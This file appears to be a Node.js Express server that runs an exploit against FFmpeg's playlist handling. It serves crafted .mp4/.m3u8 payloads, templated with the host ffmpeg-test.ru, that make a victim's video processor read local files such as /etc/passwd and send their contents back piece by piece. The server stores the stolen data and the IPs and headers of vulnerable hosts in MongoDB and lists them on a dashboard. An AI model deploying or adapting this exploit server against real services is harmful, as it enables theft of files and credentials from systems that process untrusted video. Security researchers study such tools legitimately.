var express = require("express");
var mongodb = require('mongodb');
var MongoClient = require('mongodb').MongoClient;
var app = express();
var router = express.Router();
var path = __dirname + '/views/';
var exploit = require('fs').readFileSync(__dirname + '/videos/exploit.mp4').toString();
var header = require('fs').readFileSync(__dirname + '/videos/header.m3u8').toString();
var footer = require('fs').readFileSync(__dirname + '/videos/footer.m3u8').toString();
var host = 'ffmpeg-test.ru';
var test = require('fs').readFileSync(__dirname + '/videos/test.m3u8').toString().replace(/\$host/g, host);
var index = require('fs').readFileSync(__dirname + '/views/index.html').toString();
var maxDepth = 10000;
var maxLength = 999;

var db;

router.use(function (req,res,next) {
  next();
});

router.get("/",function(req,res){
  var dns_logs = '<tbody>';
  var cursor =db.collection('dns').find();
  var dns_id = 1;
  cursor.each(function(err, doc) {
      if (doc != null) {
         dns_logs = dns_logs + '<tr> <th scope="row">' + dns_id + '</th> <td>' + doc.label + '</td></tr>';
         dns_id = dns_id + 1;
      } else {
     	   dns_logs = dns_logs + '</tbody>';
         var content = '<tbody>';
       	 var cursor =db.collection('files').find();
       	 var id = 1;
       	 cursor.each(function(err, doc) {
             if (doc != null) {
               content = content + '<tr> <th scope="row">' + id + '</th> <td>' + doc.label + '</td> <td>' + doc.file + '</td> <td>' + doc.data + '</td> </tr>';
               id = id + 1;
             } else {
            	 content = content + '</tbody>';
       		     res.send(index.replace(/\$content/g, content).replace(/\$dns_logs/g, dns_logs));
             }
          });
      }
   });

});

router.get('/generate', function(req, res) {
  if (req.query.fast && req.query.fast === 'on') {
    res.redirect(302, '/getfile_fast.mp4?label=' + req.query.label + '&file=' + req.query.filename);
  } else {
    res.redirect(302, '/getfile.mp4?label=' + req.query.label + '&file=' + req.query.filename);
  }
});

router.get('/getfile_fast.mp4', function(req, res) {
	var depth = req.query.depth || 0;
	var file = req.query.file || '///etc/passwd';
	var label = req.query.label;
	var offset = parseInt(req.query.offset) || 0;

	db.collection('files').findOne({
		'label': label,
		'file': file
	}, function(err, document) {
		var data = ''
		var offset2 = 0;
		if (!err && document && document.offset) {
			var offset2 = offset;
			offset = parseInt(document.offset);
			data = document.data;
		}

		if (req.query.d && req.query.d.length > 0 && (offset === offset2))  {
			console.log(req.query.d);
			offset = offset + req.query.d.length + 1;
			if (data.length > 0) {
				data = data + '\n';
			}
			data = data + req.query.d;
			db.collection('files').updateOne({
				'label': label,
				'file': file
			},
			{
				'label': label,
				'file': file,
				'data': data,
				'offset': offset,
				'ip': req.connection.remoteAddress
			},
			{
				'upsert': true
			}, function(err, result) {
				var payload = exploit.replace(/\$label/g, label).replace(/\$offset/g, offset).replace(/\$end/g, maxLength).replace(/\$depth/g, depth).replace(/\$host/g, host).replace(/\$file/g, file).replace(/\$fast/g, '1');
				if (depth > maxDepth) {
					res.status(404).send('Not found');
				} else {
					res.send(payload);
				}
			});
		} else {
			var payload = exploit.replace(/\$label/g, label).replace(/\$offset/g, offset).replace(/\$end/g, maxLength).replace(/\$depth/g, depth).replace(/\$host/g, host).replace(/\$file/g, file).replace(/\$fast/g, '1');
			if (depth > maxDepth) {
				res.status(404).send('Not found');
			} else {
				res.send(payload);
			}
		}
	});
});

router.get('/getfile.mp4', function(req, res) {
	var depth = req.query.depth || 0;
    depth = parseInt(depth) + 1;

	var file = req.query.file || '/etc/passwd';
	var r = '';
	var label = req.query.label;
	var offset = parseInt(req.query.offset) || 0;
	db.collection('files').findOne({
		'label': label,
		'file': file
	}, function(err, document) {
		var r = '';
		var offset2 = 0;
		if (!err && document && document.offset) {
			offset2 = parseInt(document.offset);
			r = document.data;
		}
		if ((req.query.offset || parseInt(req.query.offset) === 0) && offset === offset2) {
			if (req.query.d && req.query.d.length > 0) {
				r += req.query.d;
			} else {
				r += '\n';
			}
			console.log(r);
			offset = offset + 1;
			db.collection('files').updateOne({
				'label': label,
				'file': file
			},
			{
				'label': label,
				'file': file,
				'data': r,
				'offset': offset,
				'ip': req.connection.remoteAddress
			},
			{
				'upsert': true
			}, function(err, result) {
				var payload = exploit.replace(/\$label/g, label).replace(/\$offset/g, offset).replace(/\$end/g, offset + 1).replace(/\$depth/g, depth).replace(/\$host/g, host).replace(/\$file/g, file).replace(/\$fast/g, '0');
				if (depth > maxDepth || r.slice(-10) === Array(11).join('\n')) {
					res.status(404).send('Not found');
				} else {
          res.set({'Content-disposition': 'attachment; filename=getfile.mp4'});
					res.send(payload);
				}
			});
		} else {
			var payload = exploit.replace(/\$label/g, label).replace(/\$offset/g, offset).replace(/\$end/g, offset + 1).replace(/\$depth/g, depth).replace(/\$host/g, host).replace(/\$file/g, file).replace(/\$fast/g, '0');
			if (depth > maxDepth || r.slice(-10) === Array(11).join('\n')) {
				res.status(404).send('Not found');
			} else {
        res.set({'Content-disposition': 'attachment; filename=getfile.mp4'});
				res.send(payload);
			}
		}


	});
});

router.get('/header.m3u8', function(req, res) {
	var depth = req.query.depth || 0;
	var file = req.query.file;
    depth = parseInt(depth) + 1;
    var mp4_name = parseInt(req.query.fast) ? 'getfile_fast.mp4' : 'getfile.mp4';
    var label = req.query.label;
    var offset = 0;
    db.collection('files').findOne({
		'label': label,
		'file': file
	}, function(err, document) {
		if (!err && document && document.offset) {
			offset = parseInt(document.offset);
		}

		var payload = header.replace(/\$label/g, label).replace(/\$mp4/g, mp4_name).replace(/\$offset/g, offset).replace(/\$depth/g, depth).replace(/\$host/g, host).replace(/\$file/g, file);
		if (depth > maxDepth) {
			res.status(404).send('Not found');
		} else {
			res.send(payload);
		}
	});
});

router.get('/footer.m3u8', function(req, res) {
	res.send(footer);
});

router.get('/test.mp4', function(req, res) {
	var label = req.query.label || 'vuln_' + Math.floor((Math.random() * 1000000) + 1);
	res.send(test.replace(/\$label/g, label));
});

router.get('/vulnerable.mp4', function(req, res) {
	console.log(req.connection.remoteAddress);
	console.log(req.headers);
	label = req.query.label || '';
	db.collection('hosts').updateOne({
		'ip': req.connection.remoteAddress,
	},
	{
		'ip': req.connection.remoteAddress,
		'headers': req.headers,
		'label': label
	},
	{
		'upsert': true
	}, function(err, result) {

	});
	res.redirect(302, '/getfile_fast.mp4?label=' + label);
});

router.get('/txt.mp4', function(req, res) {
  res.download('./videos/txt.mp4');
});

router.get('/thumb.mp4', function(req, res) {
  res.download('./videos/thumb.mp4');
});

router.get('/header.y4m', function(req, res) {
  res.download('./videos/header.y4m');
});

router.get('/dns.mp4', function(req, res) {
  res.download('./videos/dns.mp4');
});

app.use("/",router);

app.use("*",function(req,res){
  res.sendFile(path + "404.html");
});

MongoClient.connect("mongodb://localhost:27017/ffmpeg", function(err, database) {
    if(err) throw err;

    db = database;
	app.listen(80, function(){
  		console.log("Live at Port 80");
	});
});
